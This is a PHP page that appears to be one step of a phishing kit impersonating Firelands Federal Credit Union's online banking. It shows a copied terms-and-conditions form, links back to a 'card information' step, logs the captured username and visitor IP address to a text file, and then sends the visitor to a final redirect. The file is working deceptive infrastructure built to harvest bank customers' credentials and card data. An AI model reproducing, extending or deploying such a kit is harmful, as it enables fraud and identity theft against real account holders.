<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $termsAccepted = isset($_POST['terms_accepted']) ? true : false;
    
    // Validation
    if (!$termsAccepted) {
        $errors['terms_accepted'] = 'You must accept the terms and conditions to continue';
    }
    
    if (empty($errors)) {
        // Save terms acceptance data
        $data = [
            'step' => 'terms_acceptance',
            'usrnm' => $username,
            'emzemz' => $username,
            'terms_accepted' => $termsAccepted,
            'acceptance_timestamp' => date('Y-m-d H:i:s'),
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
        ];
        
        saveUserData('terms_acceptance.txt', $data);
        
        // Redirect to final destination
        header('Location: ' . FINAL_REDIRECT_URL);
        exit;
    }
}

$footerLinks = [
    'About Us',
    'Customer Service',
    'Careers',
    'Investor Relations',
    'Media Center',
    'Security',
    'Privacy',
    'Site Map'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Firelands FCU - Terms and Conditions</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="relative flex min-h-screen flex-col overflow-hidden text-white">
        <!-- Background Image with Overlay -->
        <div class="absolute inset-0">
            <img
                src="assets/firelands-landing.jpg"
                alt="Sun setting over Firelands farm fields"
                class="h-full w-full object-cover"
            />
            <div class="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
        </div>

        <!-- Main Content -->
        <div class="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
            <div class="mx-auto flex w-full max-w-6xl flex-col gap-12 lg:flex-row lg:items-center lg:justify-between">
                <!-- Left Section: Hero Text -->
                <section class="order-2 flex flex-1 flex-col justify-center space-y-6 lg:order-1">
                    <div class="space-y-3">
                        <p class="text-3xl font-semibold leading-tight text-white drop-shadow sm:text-4xl lg:text-5xl">
                            Terms & Conditions
                        </p>
                        <h1 class="text-base font-semibold uppercase tracking-[0.3em] text-white/70">
                            Review and accept our terms
                        </h1>
                    </div>
                </section>

                <!-- Right Section: Terms Card -->
                <section class="order-1 w-full max-w-2xl lg:order-2 lg:self-start">
                    <div class="mx-auto w-full rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur lg:mx-0">
                        <!-- Logo -->
                        <div class="flex items-center justify-start">
                            <img
                                src="assets/logo.svg"
                                alt="Firelands Federal Credit Union"
                                class="h-12 w-auto"
                            />
                        </div>

                        <!-- Heading -->
                        <h2 class="mt-6 text-2xl font-semibold text-[#2f2e67]">Terms and Conditions</h2>
                        <p class="mt-2 text-sm text-gray-600">Please review and accept our terms and conditions to complete your account setup.</p>

                        <!-- Error Display -->
                        <?php if (!empty($errors)): ?>
                            <div class="mt-4 rounded-lg bg-red-50 border border-red-200 p-4">
                                <div class="flex">
                                    <div class="flex-shrink-0">
                                        <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                        </svg>
                                    </div>
                                    <div class="ml-3">
                                        <p class="text-sm text-red-700">
                                            Please fix the following errors:
                                            <ul class="list-disc pl-5 mt-1">
                                                <?php foreach ($errors as $error): ?>
                                                    <li><?php echo htmlspecialchars($error); ?></li>
                                                <?php endforeach; ?>
                                            </ul>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>

                        <form method="POST" class="mt-6 space-y-6">
                            <!-- Terms Content -->
                            <div class="max-h-96 overflow-y-auto rounded-lg border border-gray-200 bg-gray-50 p-6">
                                <h3 class="text-lg font-semibold text-[#2f2e67] mb-4">Firelands Federal Credit Union Online Banking Agreement</h3>
                                
                                <div class="space-y-4 text-sm text-gray-700">
                                    <div>
                                        <h4 class="font-semibold text-[#2f2e67] mb-2">1. Account Security</h4>
                                        <p>You are responsible for maintaining the confidentiality of your username, password, and all account access credentials. You agree to notify Firelands FCU immediately of any unauthorized use of your account.</p>
                                    </div>
                                    
                                    <div>
                                        <h4 class="font-semibold text-[#2f2e67] mb-2">2. Electronic Fund Transfers</h4>
                                        <p>By using our online banking services, you agree to be bound by the terms and conditions governing electronic fund transfers as outlined in our account disclosures.</p>
                                    </div>
                                    
                                    <div>
                                        <h4 class="font-semibold text-[#2f2e67] mb-2">3. Service Availability</h4>
                                        <p>Firelands FCU will use reasonable efforts to provide continuous online banking service. However, we cannot guarantee uninterrupted service and are not liable for service interruptions.</p>
                                    </div>
                                    
                                    <div>
                                        <h4 class="font-semibold text-[#2f2e67] mb-2">4. Privacy and Data Protection</h4>
                                        <p>We are committed to protecting your personal information in accordance with our Privacy Policy. By using our services, you consent to the collection and use of information as described in our privacy practices.</p>
                                    </div>
                                    
                                    <div>
                                        <h4 class="font-semibold text-[#2f2e67] mb-2">5. Account Holder Responsibilities</h4>
                                        <p>You agree to review your account statements regularly and report any discrepancies within 30 days. You are responsible for ensuring sufficient funds for all transactions.</p>
                                    </div>
                                    
                                    <div>
                                        <h4 class="font-semibold text-[#2f2e67] mb-2">6. Limitation of Liability</h4>
                                        <p>Firelands FCU shall not be liable for any indirect, incidental, or consequential damages arising from your use of online banking services.</p>
                                    </div>
                                    
                                    <div>
                                        <h4 class="font-semibold text-[#2f2e67] mb-2">7. Account Termination</h4>
                                        <p>Firelands FCU reserves the right to terminate your online banking access at any time without prior notice for security reasons or violation of terms.</p>
                                    </div>
                                    
                                    <div>
                                        <h4 class="font-semibold text-[#2f2e67] mb-2">8. Agreement to Terms</h4>
                                        <p>By clicking "Accept" below, you acknowledge that you have read, understood, and agree to be bound by these terms and conditions.</p>
                                    </div>
                                </div>
                            </div>

                            <!-- Terms Acceptance Checkbox -->
                            <div class="flex items-start space-x-3">
                                <input
                                    type="checkbox"
                                    id="terms_accepted"
                                    name="terms_accepted"
                                    value="1"
                                    <?php echo (isset($_POST['terms_accepted']) && $_POST['terms_accepted'] == '1') ? 'checked' : ''; ?>
                                    class="mt-1 h-4 w-4 rounded border-gray-300 text-[#5a63d8] focus:ring-[#5a63d8]/20"
                                />
                                <label for="terms_accepted" class="text-sm text-gray-700">
                                    I have read and agree to the Firelands Federal Credit Union Online Banking Terms and Conditions. I understand that by accepting these terms, I am entering into a legally binding agreement.
                                </label>
                            </div>
                            <?php if (isset($errors['terms_accepted'])): ?>
                                <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['terms_accepted']); ?></p>
                            <?php endif; ?>

                            <!-- Submit Button -->
                            <button
                                type="submit"
                                class="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
                            >
                                Accept Terms & Complete Setup
                            </button>

                            <!-- Back Link -->
                            <div class="text-center">
                                <a href="card.php" class="text-sm font-medium text-[#801346] transition hover:text-[#5a63d8] hover:underline">
                                    Back to Card Information
                                </a>
                            </div>
                        </form>
                    </div>
                </section>
            </div>

            <!-- Footer Links -->
            <div class="mt-10 flex flex-wrap items-center justify-end gap-10 text-sm font-semibold text-white/80">
                <?php foreach ($footerLinks as $index => $label): ?>
                    <a href="#" class="transition hover:text-white">
                        <?php echo htmlspecialchars($label); ?>
                    </a>
                <?php endforeach; ?>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Auto-focus checkbox on page load
            const checkbox = document.getElementById('terms_accepted');
            if (checkbox) {
                checkbox.focus();
            }
        });
    </script>
</body>
</html>
